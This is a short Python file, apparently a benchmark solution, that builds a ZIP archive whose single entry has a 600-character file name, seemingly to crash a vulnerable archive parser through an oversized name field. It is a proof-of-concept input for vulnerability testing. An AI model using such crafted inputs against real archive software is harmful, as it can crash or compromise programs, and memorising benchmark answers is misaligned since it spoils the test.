from io import BytesIO
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        name_len = 600
        fname = ("A" * (name_len - 4)) + ".txt"

        bio = BytesIO()
        with zipfile.ZipFile(bio, mode="w", compression=zipfile.ZIP_STORED, allowZip64=False) as zf:
            zi = zipfile.ZipInfo(fname)
            zi.date_time = (1980, 1, 1, 0, 0, 0)
            zi.compress_type = zipfile.ZIP_STORED
            zi.create_system = 0
            zf.writestr(zi, b"X")
        return bio.getvalue()